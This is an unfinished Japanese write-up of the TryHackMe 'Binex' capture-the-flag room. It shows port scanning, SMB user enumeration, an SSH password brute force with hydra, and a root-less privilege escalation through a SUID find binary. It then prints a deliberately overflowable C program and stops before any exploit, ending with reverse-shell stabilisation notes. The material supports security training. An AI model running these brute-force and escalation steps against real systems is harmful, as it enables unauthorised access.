# Binex CTF

https://tryhackme.com/room/binex

## Enumeration

```shell
TARGET=10.10.53.229
```

### ポートスキャン

```sh
$ rustscan -a $TARGET
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit
Open 10.10.53.229:22
Open 10.10.53.229:139
Open 10.10.53.229:445
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-18 16:58 JST
Initiating Ping Scan at 16:58
Scanning 10.10.53.229 [4 ports]
Completed Ping Scan at 16:58, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:58
Completed Parallel DNS resolution of 1 host. at 16:58, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:58
Scanning 10.10.53.229 [3 ports]
Discovered open port 139/tcp on 10.10.53.229
Discovered open port 445/tcp on 10.10.53.229
Discovered open port 22/tcp on 10.10.53.229
Completed SYN Stealth Scan at 16:58, 0.30s elapsed (3 total ports)
Nmap scan report for 10.10.53.229
Host is up, received echo-reply ttl 61 (0.26s latency).
Scanned at 2025-06-18 16:58:51 JST for 0s

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 61
139/tcp open  netbios-ssn  syn-ack ttl 61
445/tcp open  microsoft-ds syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```

SSH と SMB

### SMB

ユーザー名列挙

```sh
$ enum4linux -R 1000-1003 $TARGET

S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)
```

ヒントから、tryhackme のパスワードが脆弱なはず。

### SSH Hydra

```sh
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt $TARGET ssh -t 30

[22][ssh] host: 10.10.53.229   login: tryhackme   password: [REDACTED]
```

## SUID :: Binary 1

問題文から、des ユーザーのフラグを読む必要がある。

find コマンドに、des ユーザーの SUID が付いている。

```sh
tryhackme@THM_exploit:~$ find / -perm -u=s -type f -ls 2>/dev/null
   262721    236 -rwsr-sr-x   1 des      des               238080 Nov  5  2017 /usr/bin/find
```

権限昇格

```sh
tryhackme@THM_exploit:~$ find . -exec /bin/sh -p \; -quit
$ id
uid=1002(tryhackme) gid=1002(tryhackme) euid=1001(des) egid=1001(des) groups=1001(des),1002(tryhackme)
```

des ユーザーのパスワードを教えてくれる親切設計。

```sh
$ cat /home/des/flag.txt
Good job on exploiting the SUID file. Never assign +s to any system executable files. Remember, Check gtfobins.

You flag is THM{.....................}

login crdential (In case you need it)
username: des
password: [REDACTED]
```

## Buffer Overflow :: Binary 2

次は、kel ユーザーのフラグが目標。

bof に kel の SUID が付いている。

```sh
des@THM_exploit:~$ ls -al
total 52
drwx------ 4 des  des  4096 Jan 17  2020 .
drwxr-xr-x 6 root root 4096 Jan 17  2020 ..
-rw------- 1 root root 1740 Jan 12  2020 .bash_history
-rw-r--r-- 1 des  des   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 des  des  3771 Apr  4  2018 .bashrc
-rwsr-xr-x 1 kel  kel  8600 Jan 17  2020 bof
-rw-r--r-- 1 root root  335 Jan 17  2020 bof64.c
drwx------ 2 des  des  4096 Jan 12  2020 .cache
-r-x------ 1 des  des   237 Jan 17  2020 flag.txt
drwx------ 3 des  des  4096 Jan 12  2020 .gnupg
-rw-r--r-- 1 des  des   807 Apr  4  2018 .profile
```

bof64.c

```c
#include <stdio.h>
#include <unistd.h>

int foo(){
        char buffer[600];
        int characters_read;
        printf("Enter some string:\n");
        characters_read = read(0, buffer, 1000);
        printf("You entered: %s", buffer);
        return 0;
}

void main(){
        setresuid(geteuid(), geteuid(), geteuid());
        setresgid(getegid(), getegid(), getegid());

        foo();
}
```

大きくバッファオーバーフローしている。

```sh
$ pwn checksec ./bof
[*] '/home/kali/ctf/binex/bof'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

スタックが実行可能になっているので、オーバーフロー部分にシェルコードを上書きして実行させれば良いと思われる。ただし、pwn がインストールされていないため、どうやって実行するかという問題はある。

続きは後日。

## 権限昇格

## 振り返り

-
-

## シェル安定化メモ

```shell
# python が無くても、python3 でいける場合もある
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236

```
